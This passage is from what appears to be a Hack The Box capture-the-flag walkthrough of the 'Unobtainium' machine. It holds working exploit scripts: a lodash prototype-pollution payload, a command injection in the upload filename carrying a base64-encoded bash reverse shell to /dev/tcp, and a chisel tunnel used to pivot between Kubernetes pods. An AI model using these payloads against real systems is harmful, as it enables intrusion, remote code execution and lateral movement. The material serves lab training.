┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$ ls
stuff  unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum  unobtainium_debian.zip
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web]
└──╼ [★]$ cd stuff/
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web/stuff]
└──╼ [★]$ ls
opt  usr</code></pre>
                                <p>
                                    Inside <code class="highlighter-rouge">stuff/opt/unobtainium/</code> there is a executable called <code class="highlighter-rouge">unobtainium</code>
                                </p>
                                <p>
                                    Let's <code class="highlighter-rouge">run</code> that
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web/stuff/opt/unobtainium]
└──╼ [★]$ pwd
/root/Desktop/HTB/Unobtainium/web/stuff/opt/unobtainium
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web/stuff/opt/unobtainium]
└──╼ [★]$ ls
chrome_100_percent.pak  icudtl.dat    libGLESv2.so          LICENSE.electron.txt    resources          swiftshader              vk_swiftshader_icd.json
chrome_200_percent.pak  libEGL.so     libvk_swiftshader.so  LICENSES.chromium.html  resources.pak      unobtainium
chrome-sandbox          libffmpeg.so  libvulkan.so          locales                 snapshot_blob.bin  v8_context_snapshot.bin
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium/web/stuff/opt/unobtainium]
└──╼ [★]$ ./unobtainium --no-sandbox
(node:8364) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information</code></pre>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd1.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    We got the error <code class="highlighter-rouge">Unable to reach unobtainium.htb</code>.
                                </p>
                                <p>
                                    Let's add <code class="highlighter-rouge">unobtainium.htb</code> in our <code class="highlighter-rouge">/etc/hosts</code> file.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd2.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Let's again open the <code class="highlighter-rouge">executable</code> and this time we don't get <code class="highlighter-rouge">error</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd3.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    I think this <code class="highlighter-rouge">executable</code> contact to a server so for <code class="highlighter-rouge">capture</code> the packet i use <code class="highlighter-rouge">wireshark</code> on tun0.
                                </p>
                                <p>
                                    And i am <code class="highlighter-rouge">right</code> when i click on <code class="highlighter-rouge">Todo</code> they send a <strong>POST</strong> req to the <code class="highlighter-rouge">server</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd4.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Let's <code class="highlighter-rouge">check</code> what was capture inside this <code class="highlighter-rouge">POST</code> req.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd5.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">POST /todo HTTP/1.1

Host: unobtainium.htb:31337

Connection: keep-alive

Content-Length: 73

Accept: application/json, text/javascript, \*/\*; q=0.01

User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36

Content-Type: application/json

Accept-Encoding: gzip, deflate

Accept-Language: en-US

  

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}HTTP/1.1 200 OK

X-Powered-By: Express

Content-Type: application/json; charset=utf-8

Content-Length: 293

ETag: W/"125-tNs2+nU0UiQGmLreBy4Pj891aVA"

Date: Sat, 17 Apr 2021 04:41:15 GMT

Connection: keep-alive

Keep-Alive: timeout=5

  

{"ok":true,"content":"1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json\_api/v1\\n7. Improve security\\n"}</code></pre>
                                <p>
                                    We got the <code class="highlighter-rouge">creads</code>.
                                </p>
                                <p>
                                    It's seems like <code class="highlighter-rouge">Todo</code> function has the <code class="highlighter-rouge">capability</code> to read files from the <code class="highlighter-rouge">server</code>.
                                </p>
                                <p>
                                    For the <code class="highlighter-rouge">simplicity</code> i wrote a <code class="highlighter-rouge">script</code> to check if we also read file from the <code class="highlighter-rouge">server</code>?.
                                </p>
                                <p>
                                    I also run the <code class="highlighter-rouge">burp</code> for capture the <code class="highlighter-rouge">req</code>.
                                </p>
                                <p>
                                    Before <code class="highlighter-rouge">running</code> the script install the <code class="highlighter-rouge">requirements</code> for the script.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">apt-get install jq</code></pre>
                                <h2><strong>dedsec.sh</strong></h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
PROXY="127.0.0.1:8080"
FILE=$1

cat - &#x3C;&#x3C;EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

CONTENT="$(curl -s \
                -A "${UA}" \
                -H "Content-Type: application/json" \
                -d "$(cat message.json | jq -c)" \
                -x "${PROXY}" \
                http://${RHOST}:${RPORT}/todo \
           | jq .content \
           | sed -e 's/^.//' -e 's/.$//')"

printf "$CONTENT"</code></pre>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd6.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Got the <code class="highlighter-rouge">req</code> let's send it to <code class="highlighter-rouge">repeater</code> and check the responce.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp1.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    It's said No such file or <code class="highlighter-rouge">directory</code> found because we don't give any <code class="highlighter-rouge">filename</code> and we also see a interesting file called <code class="highlighter-rouge">index.js</code>.
                                </p>
                                <p>
                                    Let's add <code class="highlighter-rouge">index.js</code> inside filename.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp2.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    We got the <code class="highlighter-rouge">index.js</code> but it in bad <code class="highlighter-rouge">format</code>.
                                </p>
                                <p>
                                    After <code class="highlighter-rouge">Beautify</code> the file we got <code class="highlighter-rouge">this</code>.
                                </p>
                                <h2>Index.js</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-javascript line-numbers">var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");
const bodyParser = require('body-parser');
const _ = require('lodash');
const app = express();
var fs = require('fs');

const users = [
 {name: 'felamos', password: 'Winter2021'},
 {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];

let messages = [];
let lastId = 1;

function findUser(auth) {
 return users.find((u) =>
 u.name === auth.name &&
 u.password === auth.password);
}

app.use(bodyParser.json());

app.get('/', (req, res) => {
 res.send(messages);
});

app.put('/', (req, res) => {
 const user = findUser(req.body.auth || {});

 if (!user) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }

 const message = {
 icon: '__',
 };

 _.merge(message, req.body.message, {
 id: lastId++,
 timestamp: Date.now(),
 userName: user.name,
 });

 messages.push(message);
 res.send({ok: true});
});

app.delete('/', (req, res) => {
 const user = findUser(req.body.auth || {});

 if (!user || !user.canDelete) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }

 messages = messages.filter((m) => m.id !== req.body.messageId);
 res.send({ok: true});
});
app.post('/upload', (req, res) => {
 const user = findUser(req.body.auth || {});
 if (!user || !user.canUpload) {
 res.status(403).send({ok: false, error: 'Access denied'});
 return;
 }


 filename = req.body.filename;
 root.upload("./",filename, true);
 res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
        const user = findUser(req.body.auth || {});
        if (!user) {
                res.status(403).send({ok: false, error: 'Access denied'});
                return;
        }

        filename = req.body.filename;
 testFolder = "/usr/src/app";
 fs.readdirSync(testFolder).forEach(file => {
 if (file.indexOf(filename) > -1) {
 var buffer = fs.readFileSync(filename).toString();
 res.send({ok: true, content: buffer});
 }
 });
});

app.listen(3000);
console.log('Listening on port 3000...');</code></pre>
                                <p>
                                    After <code class="highlighter-rouge">reading</code> the file i found nothing <code class="highlighter-rouge">interesting</code> but i am sure that it's using <code class="highlighter-rouge">react</code> or nodejs or something like that if the <code class="highlighter-rouge">server</code> uses that so there is a file called <code class="highlighter-rouge">package.json</code> which has the list of npm packages used and we also find <code class="highlighter-rouge">vulnerability</code> for that specific <code class="highlighter-rouge">packages</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp3.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    After beautify the <code class="highlighter-rouge">package.json</code> and we got this
                                </p>
                                <h2>package.json</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-json line-numbers">{
  "name": "Unobtainium-Server",
  "version": "1.0.0",
  "description": "API Service for Electron client",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "felamos",
  "license": "ISC",
  "dependencies": {
    "body-parser": "1.18.3",
    "express": "4.16.4",
    "lodash": "4.17.4",
    "google-cloudstorage-commands": "0.0.1"
  },
  "devDependencies": {}
}</code></pre>
                                <blockquote>
                                    <code class="highlighter-rouge">Lodash</code> : <a href="https://snyk.io/vuln/SNYK-JS-LODASH-73638" target="_blank">Prototype Pollution</a>
                                </blockquote>
                                <blockquote>
                                    <code class="highlighter-rouge">google-cloudstorage-commands</code> : <a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431" target="_blank">Command Injection</a>
                                </blockquote>
                                <p>
                                    With the help of <code class="highlighter-rouge">Lodash -> Prototype Pollution</code> we give ourself a permission of <strong>upload</strong> & <strong>delete</strong> with changing <code class="highlighter-rouge">canDelete</code> and <code class="highlighter-rouge">canUpload</code> to be <strong>True</strong>.
                                </p>
                                <p>
                                    And with help of <code class="highlighter-rouge">google-cloudstorage-commands -> Command Injection</code> We can execute <code class="highlighter-rouge">commands</code> on server.
                                </p>
                                <p>
                                    So let's <code class="highlighter-rouge">first</code> give ourself a permission to <code class="highlighter-rouge">upload</code> file and <code class="highlighter-rouge">delete</code> files
                                </p>
                                <p>
                                    For that i create a <code class="highlighter-rouge">script</code> to keep things <code class="highlighter-rouge">simple</code>.
                                </p>
                                <h2>Exploit.sh</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
PROXY="127.0.0.1:8080"
TEXT="$1"

cat - &#x3C;&#x3C;EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "message":
    {
        "text":${TEXT}
    }
}
EOF

curl -s \
     -X PUT \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -x "${PROXY}" \
     "http://${RHOST}:${RPORT}/" \
| jq .</code></pre>
                                <p>
                                    Let's run the <code class="highlighter-rouge">exploit</code>
                                </p>
                                <p>
                                    <strong style="color: red;">Imp</strong> -> before running the <code class="highlighter-rouge">exploit</code> intercept the request and <code class="highlighter-rouge">forward</code> the req becuase we use proxy inside <code class="highlighter-rouge">exploit</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ chmod +x exploit.sh 
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ ./exploit.sh '{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}'
{
  "ok": true
}
┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ </code></pre>
                                <p>
                                    It's <code class="highlighter-rouge">responce</code> is true means now we have the <code class="highlighter-rouge">permission</code>.
                                </p>
                                <p>
                                    Let's check we can <code class="highlighter-rouge">write</code> in a <strong>file</strong> or <strong>not</strong>.
                                </p>
                                <p>
                                    I create <code class="highlighter-rouge">another</code> one exploit to <code class="highlighter-rouge">write</code> in a file.
                                </p>
                                <h2>exploit_stage2.sh</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">#!/bin/bash

RHOST="unobtainium.htb"
RPORT=31337
UA="Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
PROXY="127.0.0.1:8080"
FILE="& echo dedsec | tee dedsec.txt"

cat - &#x3C;&#x3C;EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

curl -s \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -x "${PROXY}" \
     -o /dev/null \
     "http://${RHOST}:${RPORT}/upload"</code></pre>
                                <p>
                                    The exploit write the content <code class="highlighter-rouge">"dedsec"</code> inside <code class="highlighter-rouge">dedsec.txt</code>.
                                </p>
                                <p>
                                    Now let's run the <code class="highlighter-rouge">exploit</code> and capture the <code class="highlighter-rouge">req</code> in burp.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd7.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    It's said <code class="highlighter-rouge">true</code>. it's means we should be able to read <code class="highlighter-rouge">dedsec.txt</code> and get the content dedsec inside <code class="highlighter-rouge">dedsec.txt</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp4.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Just change filename to <code class="highlighter-rouge">dedsec.txt</code> for view the content <code class="highlighter-rouge">inside</code> that.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp5.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    And we see dedsec inside <code class="highlighter-rouge">dedsec.txt</code> Now let's try to get <code class="highlighter-rouge">reverse</code> shell through that.
                                </p>
                                <p>
                                    Just add the <code class="highlighter-rouge">reverse</code> shell inside <code class="highlighter-rouge">filename</code>.
                                </p>
                                <p>
                                    Before send <code class="highlighter-rouge">req</code> start your <code class="highlighter-rouge">netcat</code> listner.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/burp6.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">POST /upload HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Content-Type: application/json
Content-Length: 151
Connection: close

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1' | base64) | base64 -d | bash"}</code></pre>
                                <p>
                                    Let's check the <code class="highlighter-rouge">netcat</code> listner.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd8.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ nc -nvlp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.235.
Ncat: Connection from 10.10.10.235:34380.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
root@webapp-deployment-5d764566f4-lrpt9:/usr/src/app#</code></pre>
                                <p>
                                    Boom we got the <code class="highlighter-rouge">shell</code>.
                                </p>
                                <p>
                                    First Let's get our <code class="highlighter-rouge">user.txt</code> inside <strong>/root/</strong>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd9.png
                                        alt="unobtainium.htb" />
                                </p>
                                <h2>
                                    Privilege escalation
                                </h2>
                                <p>
                                    And if you notice we are <code class="highlighter-rouge">root</code> i think it's a <code class="highlighter-rouge">docker</code> container.
                                </p>
                                <p>
                                    Anyway let's run <code class="highlighter-rouge">linpeas</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd10.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    there is a <code class="highlighter-rouge">cronjob</code> running that removes <code class="highlighter-rouge">kubectl</code> in the container every <code class="highlighter-rouge">minute</code>.
                                </p>
                                <p>
                                    But there is no <code class="highlighter-rouge">kubectl</code> executable in the <code class="highlighter-rouge">container</code>.
                                </p>
                                <p>
                                    Let's download a <code class="highlighter-rouge">kubectl</code> executable and transfer it in docker inside <code class="highlighter-rouge">/tmp</code> folder.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" target="_blank">Install kubectl binary with curl on Linux</a>
                                </blockquote>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd11.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    We change the name of <code class="highlighter-rouge">kubectl</code> to <code class="highlighter-rouge">xkubectl</code> to avoid being removed by the <code class="highlighter-rouge">cron job</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd12.png
                                        alt="unobtainium.htb" />
                                </p>
                                <p>
                                    Now let's first check the version of <code class="highlighter-rouge">kubectl</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl version --short
Client Version: v1.21.0
Server Version: v1.20.0
root@webapp-deployment-5d764566f4-mbprj:/# </code></pre>
                                <p>
                                    Now let’s see current <code class="highlighter-rouge">rights</code> with kubectl with <code class="highlighter-rouge">privileged</code> resources like <code class="highlighter-rouge">secrets</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl auth can-i list secrets
no
root@webapp-deployment-5d764566f4-mbprj:/# </code></pre>
                                <p>
                                    let's check about <code class="highlighter-rouge">namespaces</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl auth can-i list namespaces
Warning: resource 'namespaces' is not namespace scoped
yes
root@webapp-deployment-5d764566f4-mbprj:/# </code></pre>
                                <p>
                                    Let’s list all the <code class="highlighter-rouge">namespaces</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl get namespace             
NAME              STATUS   AGE
default           Active   90d
dev               Active   89d
kube-node-lease   Active   90d
kube-public       Active   90d
kube-system       Active   90d
root@webapp-deployment-5d764566f4-mbprj:/# </code></pre>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl auth can-i list secrets -n dev
no
root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl auth can-i list secrets -n kube-system
no </code></pre>
                                <p>
                                    We don't have permission of any <code class="highlighter-rouge">namespaces</code>.
                                </p>
                                <p>
                                    Let's check if we have <code class="highlighter-rouge">permission</code> of <code class="highlighter-rouge">pods</code> or not in the dev <code class="highlighter-rouge">namespaces</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl auth can-i list pods -n dev
yes
root@webapp-deployment-5d764566f4-mbprj:/# /tmp/xkubectl get pods -n dev            
NAME                                READY   STATUS    RESTARTS   AGE
devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         89d
devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         89d
devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         89d
root@webapp-deployment-5d764566f4-mbprj:/# </code></pre>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://kubernetes.io/docs/concepts/workloads/pods/" target="_blank">Pods</a>
                                </blockquote>
                                <p>
                                    A <code class="highlighter-rouge">Kubernetes</code> cluster can have one or more nodes. Each node can have one or more <code class="highlighter-rouge">Pods</code>. Each Pod can have one or more running <code class="highlighter-rouge">containers</code>.
                                </p>
                                <p>
                                    And we see in the <code class="highlighter-rouge">previous</code> command there is three Pods each with a running <code class="highlighter-rouge">container</code> in the dev namespace.
                                </p>
                                <p>
                                    Let's list the <code class="highlighter-rouge">description</code> of one of the <code class="highlighter-rouge">Pods</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-lrpt9:/# /tmp/xkubectl describe pod/devnode-deployment-cd86fb5c-6ms8d -n dev
Name:         devnode-deployment-cd86fb5c-6ms8d
Namespace:    dev
Priority:     0
Node:         unobtainium/10.10.10.235
Start Time:   Sun, 17 Jan 2021 18:16:21 +0000
Labels:       app=devnode
              pod-template-hash=cd86fb5c
Annotations:  &#x3C;none&#x3E;
Status:       Running
IP:           172.17.0.4
IPs:
  IP:           172.17.0.4
Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c
Containers:
  devnode:
    Container ID:   docker://fed5d9bb3199fbca3f8ad70377a9f9a65c8e55b4eea52d97b429347ad68202dc
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
    Port:           3000/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Thu, 15 Apr 2021 05:04:44 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    137
      Started:      Wed, 24 Mar 2021 16:01:28 +0000
      Finished:     Wed, 24 Mar 2021 16:02:13 +0000
    Ready:          True
    Restart Count:  28
    Environment:    &#x3C;none&#x3E;
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  default-token-rmcd6:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  default-token-rmcd6
    Optional:    false
QoS Class:       BestEffort
Node-Selectors:  &#x3C;none&#x3E;
Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:          &#x3C;none&#x3E;</code></pre>
                                <p>
                                    If you notice the difference i am in a <code class="highlighter-rouge">webapp-deployment</code> container enumerating <code class="highlighter-rouge">devnode-deployment</code> containers in Pods running in the <code class="highlighter-rouge">dev</code> namespace.
                                </p>
                                <p>
                                    We are looking at two <code class="highlighter-rouge">different</code> environments, the classic production <code class="highlighter-rouge">environment</code> and the development <code class="highlighter-rouge">environment</code>. I should be able to repeat the steps i just have to make the <code class="highlighter-rouge">RHOST</code> and <code class="highlighter-rouge">RPORT</code> variables and upload them to the container I’m <code class="highlighter-rouge">currently</code> in above to get another foothold in the <code class="highlighter-rouge">development</code> environment.
                                </p>
                                <p>
                                    For that we need to <code class="highlighter-rouge">forward</code> the port to the devnode-deployment container <code class="highlighter-rouge">"172.17.0.4:3000"</code>
                                </p>
                                <p>
                                    I am using <code class="highlighter-rouge">Chisel</code> for that.
                                </p>
                                <p>
                                    If you don't <code class="highlighter-rouge">known</code> how to use chisel or how to <code class="highlighter-rouge">download</code> it check this out.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s" target="_blank">Chisel</a>
                                </blockquote>
                                <p>
                                    First i run <code class="highlighter-rouge">chisel</code> in my <code class="highlighter-rouge">parrot</code> os to open a <code class="highlighter-rouge">server</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd13.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[/opt/chisel/linux]
└──╼ [★]$ ./chisel server -p 9999 --reverse
2021/04/17 03:35:08 server: Reverse tunnelling enabled
2021/04/17 03:35:08 server: Fingerprint aKyrwTTxlfOA+sBiTfpCMn++HxJrJUPZibazBNhgrLs=
2021/04/17 03:35:08 server: Listening on http://0.0.0.0:9999</code></pre>
                                <p>
                                    Now transfer the <code class="highlighter-rouge">chisel</code> in box and and <code class="highlighter-rouge">execute</code> as client.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd14.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">root@webapp-deployment-5d764566f4-mbprj:/tmp# ls
chisel  f  v8-compile-cache-0  xkubectl
root@webapp-deployment-5d764566f4-mbprj:/tmp# chmod +x chisel 
root@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.12:9999 R:3000:172.17.0.4:3000
2021/04/17 08:46:38 client: Connecting to ws://10.10.14.12:9999
2021/04/17 08:46:40 client: Connected (Latency 234.18646ms)</code></pre>
                                <p>
                                    Now we are <code class="highlighter-rouge">connected</code> let's give us <code class="highlighter-rouge">permission</code> for <strong>canDelete</strong> and <strong>canUpload</strong>.
                                </p>
                                <p>
                                    I again made the <code class="highlighter-rouge">script</code> for give permissions <code class="highlighter-rouge">devnode-deployment</code> container.
                                </p>
                                <h2>read_write.sh</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">#!/bin/bash

RHOST="127.0.0.1"
RPORT=3000
UA="Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
PROXY="127.0.0.1:8080"
TEXT="$1"

cat - &#x3C;&#x3C;EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "message":
    {
        "text":${TEXT}
    }
}
EOF

curl -s \
     -X PUT \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -x "${PROXY}" \
     "http://${RHOST}:${RPORT}/" \
| jq .</code></pre>
                                <p>
                                    <strong style="color: red;">Imp</strong> -> before running the <code class="highlighter-rouge">exploit</code> intercept the request and <code class="highlighter-rouge">forward</code> the req becuase we use proxy inside <code class="highlighter-rouge">exploit</code>.
                                </p>
                                <p>
                                    Now we all set let's run the <code class="highlighter-rouge">exploit</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/unobtainium/cmd15.png
                                        alt="unobtainium.htb" />
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
└──╼ [★]$ ./read_write.sh '{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}'
{
  "ok": true
}</code></pre>
                                <p>
                                    For <code class="highlighter-rouge">reverse</code> shell i create another <code class="highlighter-rouge">script</code>.
                                </p>
                                <h2>rev.sh</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-bash line-numbers">#!/bin/bash

RHOST="127.0.0.1"
RPORT=3000
UA="Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
PROXY="127.0.0.1:8080"
FILE=$1

cat - &#x3C;&#x3C;EOF > message.json
{
    "auth":
    {
        "name":"felamos",
        "password":"Winter2021"
    },
    "filename":"${FILE}"
}
EOF

curl -s \
     -A "${UA}" \
     -H "Content-Type: application/json" \
     -d "$(cat message.json | jq -c)" \
     -x "${PROXY}" \
     -o /dev/null \
     "http://${RHOST}:${RPORT}/upload"</code></pre>
                                <p>
                                    Now let's get our <code class="highlighter-rouge">reverse</code> shell with <code class="highlighter-rouge">devnode-deployment</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.12]─[root@parrot]─[~/Desktop/HTB/Unobtainium]
